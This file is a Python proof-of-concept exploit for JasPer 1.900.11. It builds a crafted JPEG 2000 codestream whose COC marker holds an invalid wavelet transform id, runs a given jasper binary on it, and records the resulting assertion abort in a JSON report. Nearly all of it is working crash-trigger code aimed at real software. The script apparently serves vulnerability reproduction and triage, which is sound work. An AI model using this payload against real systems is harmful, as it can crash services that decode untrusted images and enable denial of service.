#!/usr/bin/env python3
"""PoC: JasPer 1.900.11 jpc decoder assertion abort via crafted COC marker.

The target is the JasPer transcoder invoked as:

    jasper -f <input> -t jpc -F <output> -T pnm

The script synthesizes a raw JPEG 2000 codestream (SOC/SIZ/COD/QCD/COC/SOT/
SOD/EOC) in memory.  The COC (coding style component) marker segment carries a
deliberately invalid wavelet transform identifier (qmfbid = 2).  JasPer's
decoder accepts the value unvalidated and later hands it to JPC_NOMINALGAIN()
in jpc_t1cod.c, whose default branch asserts `qmfbid == JPC_COX_RFT'.  The
assertion failure aborts the process (SIGABRT), which the script captures and
reports in the JSON contract.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time

# Marker codes used below (JPEG 2000 codestream syntax, ISO/IEC 15444-1).
SOC = 0xFF4F  # start of codestream
SIZ = 0xFF51  # image and tile size
COD = 0xFF52  # coding style default
COC = 0xFF53  # coding style component
QCD = 0xFF5C  # quantization default
SOT = 0xFF90  # start of tile-part
SOD = 0xFF93  # start of data
EOC = 0xFFD9  # end of codestream

INVALID_QMFBID = 2  # neither 0 (reversible 5/3) nor 1 (irreversible 9/7)


def marker(code, payload=b""):
    """Serialize a marker segment: marker, big-endian length, payload."""
    return struct.pack(">HH", code, len(payload) + 2) + payload


def build_codestream():
    """Assemble the trigger codestream entirely in memory.

    Geometry is a single 8x8 tile, one component, five decomposition levels,
    so the stream is small and every header parses cleanly.  The COC segment
    overrides the component's coding style with an unsupported transform id.
    """
    siz_payload = struct.pack(">HIIIIIIIIH",
                               0,          # Rsiz (capabilities)
                               8, 8,       # Xsiz, Ysiz
                               0, 0,       # XOsiz, YOsiz
                               8, 8,       # XTsiz, YTsiz
                               0, 0,       # XTOsiz, YTOsiz
                               1)          # Csiz
    siz_payload += bytes([0x07, 0x01, 0x01])  # Ssiz, XRsiz, YRsiz of component 0

    cod_payload = (bytes([0x00])                # Scod: no precincts, no SOP/EPH
                   + bytes([0x00])              # SGcod: progression order LRCP
                   + struct.pack(">H", 1)       # SGcod: number of layers
                   + bytes([0x00])              # SGcod: no multiple component transform
                   + bytes([0x05])              # SPcod: decomposition levels
                   + bytes([0x04, 0x04])        # SPcod: code-block width/height exponents
                   + bytes([0x00])              # SPcod: code-block style
                   + bytes([0x01]))             # SPcod: 9/7 transform

    # 16 step sizes match the 5 decomposition levels (6 resolution levels,
    # 3*5+1 subbands), so quantization parsing stays on the happy path.
    qcd_payload = bytes([0x40]) + bytes([0x28 + (i // 3) for i in range(16)])

    # COC for component 0: same coding style as COD except the transform id,
    # which is set to a value the decoder never validates.
    coc_payload = (bytes([0x00])                 # Scoc: no precincts
                   + bytes([0x00])               # Ccoc: component 0 (1 byte, Csiz < 257)
                   + bytes([0x05])               # SPcod: decomposition levels
                   + bytes([0x04, 0x04])         # SPcod: code-block size exponents
                   + bytes([0x00])               # SPcod: code-block style
                   + bytes([INVALID_QMFBID]))    # SPcod: invalid transform id

    packet_data = b"\x00" * 6  # one empty packet header per resolution level

    # Psot spans the SOT segment through the end of the packet data.
    psot = 12 + 2 + len(packet_data)
    sot_payload = struct.pack(">HI", 0, psot) + bytes([0x00, 0x01])

    return b"".join([
        struct.pack(">H", SOC),
        marker(SIZ, siz_payload),
        marker(COD, cod_payload),
        marker(QCD, qcd_payload),
        marker(COC, coc_payload),
        marker(SOT, sot_payload),
        struct.pack(">H", SOD),
        packet_data,
        struct.pack(">H", EOC),
    ])


def signal_name(sig):
    if sig is None:
        return None
    try:
        return signal.Signals(sig).name
    except ValueError:
        return "SIG%d" % sig


def truncate(text, limit=20000):
    if text is None:
        return ""
    if len(text) <= limit:
        return text
    return text[:limit] + "\n... [truncated %d chars]" % (len(text) - limit)


def normalize_evidence(stderr):
    """Pull the most decision-relevant lines out of stderr."""
    if not stderr:
        return ""
    keep = []
    for line in stderr.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        if ("Assertion" in stripped
                or "assert" in stripped.lower()
                or "jasper:" in stripped
                or "Aborted" in stripped
                or "core dumped" in stripped
                or stripped.startswith("error:")
                or stripped.startswith("warning:")):
            keep.append(stripped)
    return "\n".join(keep) if keep else stderr.strip()


def main():
    parser = argparse.ArgumentParser(
        description="Trigger the JasPer 1.900.11 jpc decoder COC assertion.")
    parser.add_argument("--binary", required=True,
                        help="path to the jasper transcoder binary")
    parser.add_argument("--json-out", default=None,
                        help="optional path to write the JSON result")
    parser.add_argument("--timeout", type=float, default=300,
                        help="per-run timeout in seconds (default 300)")
    args = parser.parse_args()

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": None,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "stderr", "value": None, "path": None},
        "error": None,
    }

    payload = build_codestream()

    tmp_dir = None
    try:
        tmp_dir = tempfile.mkdtemp(prefix="jaspoc_")
        input_path = os.path.join(tmp_dir, "trigger.jpc")
        with open(input_path, "wb") as fh:
            fh.write(payload)

        command = [args.binary, "-f", input_path, "-t", "jpc",
                   "-F", os.devnull, "-T", "pnm"]
        result["command"] = command

        start = time.monotonic()
        try:
            proc = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=args.timeout,
            )
            elapsed_ms = int(round((time.monotonic() - start) * 1000))
            result["returncode"] = proc.returncode
            result["runtime_ms"] = elapsed_ms
            result["stdout"] = truncate(proc.stdout.decode("utf-8", "replace"))
            stderr_text = proc.stderr.decode("utf-8", "replace")
            result["stderr"] = truncate(stderr_text)
            if proc.returncode < 0:
                result["signal"] = signal_name(-proc.returncode)
        except subprocess.TimeoutExpired as exc:
            elapsed_ms = int(round((time.monotonic() - start) * 1000))
            result["timed_out"] = True
            result["runtime_ms"] = elapsed_ms
            result["returncode"] = None
            result["stdout"] = truncate((exc.stdout or b"").decode("utf-8", "replace"))
            result["stderr"] = truncate((exc.stderr or b"").decode("utf-8", "replace"))

        evidence = normalize_evidence(result["stderr"])
        if evidence:
            result["observable"]["value"] = evidence
        elif result["timed_out"]:
            result["observable"]["value"] = "timeout after %s ms" % result["runtime_ms"]
        else:
            result["observable"]["value"] = "no stderr output"
    except Exception as exc:  # pragma: no cover - defensive
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
    finally:
        if tmp_dir:
            for name in os.listdir(tmp_dir):
                try:
                    os.unlink(os.path.join(tmp_dir, name))
                except OSError:
                    pass
            try:
                os.rmdir(tmp_dir)
            except OSError:
                pass

    if args.json_out:
        with open(args.json_out, "w") as fh:
            json.dump(result, fh, indent=2)
            fh.write("\n")

    print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
